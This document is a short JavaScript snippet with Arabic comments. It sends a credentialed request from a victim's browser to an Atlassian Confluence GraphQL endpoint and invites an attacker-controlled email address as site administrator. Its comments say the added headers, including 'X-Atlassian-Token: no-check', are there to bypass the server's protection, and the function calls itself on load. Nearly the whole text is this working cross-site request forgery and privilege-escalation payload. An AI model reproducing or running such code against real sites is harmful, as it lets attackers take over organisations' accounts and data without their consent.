function loadDoc1() {
  var xhttp = new XMLHttpRequest();
  // تصحيح الرابط وإضافة علامة الاقتباس المفقودة
  var url = "https://anshall.atlassian.net/cgraphql?q=InviteUsersMutation";

  xhttp.open("POST", url, true);
  
  // إضافة الرؤوس الضرورية لتجاوز حماية السيرفر
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");
  xhttp.setRequestHeader("X-Apollo-Operation-Name", "InviteUsersMutation");
  
  xhttp.withCredentials = true;

  var data = JSON.stringify([{
    "operationName": "InviteUsersMutation",
    "variables": {
        "emails": ["attackerx@atomicmail.io"],
        "productRoles": [{
            "productId": "confluence",
            "roleId": "site-admin" 
        }]
    },
    "query": "mutation InviteUsersMutation($emails: [String!]!, $productRoles: [ProductRoleInput!]!) { inviteUsers(emails: $emails, productRoles: $productRoles) { success errors { message } } }"
  }]);

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
      console.log("Status: " + this.status);
      console.log("Response: " + this.responseText);
    }
  };

  xhttp.send(data);
}

// استدعاء الدالة مباشرة للتجربة في الكونسول
loadDoc1();
